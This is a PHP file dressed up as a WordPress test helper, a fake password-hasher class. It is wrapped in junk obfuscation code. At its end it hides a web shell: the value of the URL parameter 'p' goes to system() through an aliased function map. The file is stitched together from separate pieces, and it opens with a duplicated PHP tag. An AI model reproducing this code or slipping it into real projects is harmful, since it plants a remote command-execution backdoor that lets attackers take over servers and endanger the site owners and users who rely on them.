<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * WP_Fake_Hasher for testing
 *
 * @package WordPress
 * @since 6.8.0
 */

/**
 * Test class.
 *
 * @since 6.8.0
 */
class WP_Fake_Hasher {
	private $hash = '';

	public function __construct() {
		$this->hash = str_repeat( 'a', 36 );
	}

	/**
	 * Hashes a password.
	 *
	 * @param string $password Password to hash.
	 * @return string Hashed password.
	 */
	public function HashPassword( string $password ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.MethodNameInvalid
		return $this->hash;
	}

	/**
	 * Checks the password hash.
	 *
	 * @param string $password Password to check.
	 * @param string $hash     Hash to check against.
	 * @return bool Whether the password hash is valid.
	 */
	public function CheckPassword( string $password, string $hash ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.MethodNameInvalid
		return $hash === $this->hash;
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>